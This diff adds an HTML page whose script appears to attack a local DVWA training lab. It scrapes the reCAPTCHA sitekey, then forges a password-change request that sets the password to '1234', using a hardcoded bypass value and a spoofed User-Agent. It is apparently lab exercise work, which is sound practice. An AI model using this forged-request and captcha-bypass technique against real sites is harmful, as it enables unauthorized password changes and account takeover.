@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var host="http://127.0.0.1:4280/vulnerabilities/captcha/"
+        fetch(host)
+        .then(response=>response.text())
+        .then(data=>{
+            var regex = /data-sitekey="([^"]+)"/;
+            var match=data.match(regex);
+
+            if(match){
+                var sitekey=match[1];
+                console.log(sitekey)
+            }
+            if(sitekey){
+                data={
+                    "password_new":"1234",
+                    "password_conf":"1234",
+                    "data-sitekey":sitekey,
+                    "g-recaptcha-response":"hidd3n_valu3",
+                    "Change":"Change"
+                }
+                fetch(host,{
+                    method:'post',
+                    headers:{
+                        'User-Agent':"reCAPTCHA"
+                    },
+                    body:data
+                })
+                .then(res=>res.text())
+                .then(data=>{
+                    console.log("Success")
+                })
+            }
+        })
+    </script>
+</body>
+</html>
